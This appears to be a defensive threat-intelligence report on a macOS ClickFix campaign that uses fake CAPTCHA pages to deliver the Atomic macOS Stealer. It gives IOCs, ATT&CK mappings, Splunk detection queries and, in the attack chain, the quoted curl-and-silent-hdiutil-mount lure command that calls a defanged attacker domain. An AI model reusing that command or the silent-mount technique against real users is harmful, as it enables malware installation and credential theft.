---
scraped_at: 2026-06-24T00:00:00Z
source_url: https://unit42.paloaltonetworks.com/
report_type: threat-intel
severity: high
title: "macOS ClickFix Campaign Silently Mounts DMGs to Deliver Atomic macOS Stealer (AMOS)"
---

# macOS ClickFix Campaign Silently Mounts DMGs to Deliver AMOS

Palo Alto Networks Unit 42 disclosed a macOS-specific ClickFix campaign on June 23, 2026, delivering Atomic macOS Stealer (AMOS) via a novel technique: fake CAPTCHA pages instruct users to open Terminal and paste a `curl` command that downloads a DMG disk image and silently mounts it using `hdiutil attach -quiet -nobrowse`. This eliminates the Finder prompt that normally alerts users to disk image activity. Unit 42 documented 39 C2/delivery domains registered for this campaign.

## 1. IOCs

### Domains

| Indicator | Type | Notes |
|-----------|------|-------|
| svs-verificationdate[.]beer | Download / C2 domain | Malware download domain for DMG payload; AMOS C2; .beer TLD typical of ClickFix campaign infrastructure |

*Unit 42 documented 39 C2/delivery domains for this campaign; most were registered within 30 days of the report. Only one domain was confirmed via secondary sources at time of collection.*

## 2. TTPs (MITRE ATT&CK)

| Tactic | Tactic ID | Technique | Technique ID | Usage |
|--------|-----------|-----------|--------------|-------|
| Initial Access | TA0001 | Drive-by Compromise | T1189 | Victims land on attacker-controlled fake CAPTCHA / browser verification page |
| Execution | TA0002 | User Execution: Malicious File | T1204.002 | User executes Terminal command pasted from fake CAPTCHA lure |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 | Pasted bash/curl command downloads DMG and calls hdiutil attach |
| Collection | TA0009 | Credentials from Password Stores | T1555 | AMOS extracts credentials from browsers, Keychain, crypto wallets |
| Exfiltration | TA0010 | Exfiltration Over C2 Channel | T1041 | AMOS exfiltrates collected data to C2 server |

### Attack Chain

1. Victim visits a compromised or attacker-controlled page displaying a fake CAPTCHA ("I am not a robot" / "Verify you are human" / "Security check required")
2. Page instructs user to open Terminal (command is pre-selected for clipboard copy)
3. Command: `curl -fsSL https://svs-verificationdate[.]beer/<path> -o /tmp/<name>.dmg && hdiutil attach -quiet -nobrowse /tmp/<name>.dmg`
4. `hdiutil attach -quiet -nobrowse` silently mounts the DMG without Finder dialog or Gatekeeper prompt for unsigned images in some configurations
5. DMG auto-opens or the command executes the AMOS binary from the mounted `/Volumes/` path
6. AMOS collects and exfiltrates credentials

## 3. Malware & Tools

**Atomic macOS Stealer (AMOS)**
- Type: macOS infostealer, sold as Malware-as-a-Service
- Data targeted:
  - 8 Chromium-based browsers: Google Chrome, Microsoft Edge, Brave, Opera, Arc, Vivaldi, CocCoc, Yandex
  - Cryptocurrency wallets: Exodus, Electrum, Atomic Wallet, Wasabi Wallet, Bitcoin Core, Litecoin Core, DashCore, Guarda, Binance Wallet, Dogecoin Wallet, TonKeeper
  - macOS Keychain (passwords, certificates, encryption keys)
  - Browser cookies, login databases, autofill data, saved payment cards
  - Messaging application data
- Exfiltration: Packages collected data as archive; transmits to C2

## 4. Threat Actor / Campaign Attribution

No specific threat actor attributed. AMOS operates as a MaaS platform; the operators of this specific campaign are likely financially motivated. The macOS ClickFix DMG technique represents a new delivery mechanism for AMOS, previously distributed primarily via trojanized application downloads and malvertising.

## 5. Splunk Detection Searches

```spl
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
from datamodel=Endpoint.Processes
where Processes.process_name="hdiutil" Processes.parent_process_name IN ("bash","zsh","sh","Terminal","osascript")
by Processes.dest Processes.user Processes.parent_process_name
   Processes.process_name Processes.process Processes.process_id
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| search process="*attach*" AND (process="*quiet*" OR process="*nobrowse*")
| eval risk_score=case(
    match(process, "-quiet") AND match(process, "-nobrowse"), 90,
    match(process, "-quiet") OR match(process, "-nobrowse"), 80,
    1=1, 60)
| where risk_score >= 60
| table firstTime lastTime dest user parent_process_name process_name process process_id risk_score
```

```spl
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
from datamodel=Endpoint.Processes
where Processes.process_name="curl" Processes.parent_process_name IN ("bash","zsh","sh","Terminal")
by Processes.dest Processes.user Processes.parent_process_name
   Processes.process_name Processes.process Processes.process_id
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| search process IN ("*-fsSL*","*-fsS*","*-sSL*") AND process IN ("*.dmg*","*.pkg*")
| eval risk_score=case(
    match(process, "\.dmg") AND match(process, "-fsSL"), 80,
    match(process, "\.pkg") AND match(process, "-fsSL"), 75,
    1=1, 55)
| where risk_score >= 55
| table firstTime lastTime dest user parent_process_name process_name process process_id risk_score
```

```spl
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
from datamodel=Endpoint.Processes
where Processes.parent_process_name IN ("bash","zsh","sh")
by Processes.dest Processes.user Processes.parent_process_name
   Processes.process_name Processes.process Processes.process_id Processes.process_path
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| search process_path IN ("/Volumes/*")
| eval risk_score=85
| table firstTime lastTime dest user parent_process_name process_name process process_path process_id risk_score
```

## 6. Executive Summary

On June 23, 2026, Unit 42 disclosed a macOS ClickFix campaign delivering Atomic macOS Stealer (AMOS) via a novel attack chain: fake CAPTCHA pages social-engineer users into opening Terminal and pasting a `curl` command that downloads a DMG and silently mounts it using `hdiutil attach -quiet -nobrowse`. The silent mount bypasses Finder's disk image handling UI, reducing visible alerts to the user. The AMOS payload then executes from the mounted volume, stealing credentials from 8 Chromium-based browsers, cryptocurrency wallets, macOS Keychain, and messaging applications. The attack requires no vulnerability — it relies entirely on social engineering. The `hdiutil attach -quiet` pattern called from a shell is the most reliable behavioral detection. Unit 42 documented 39 campaign C2/delivery domains.

## References

- [BleepingComputer — New macOS ClickFix Attack Silently Mounts DMGs to Push Infostealer (2026-06-23)](https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/)
- [Unit 42 — Palo Alto Networks Threat Intelligence](https://unit42.paloaltonetworks.com/)
- [Unit 42 — ClickFix Factory: First Exposure of IUAM Generator (2025-10-08)](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [MITRE T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
- [MITRE T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
- [MITRE T1555 — Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
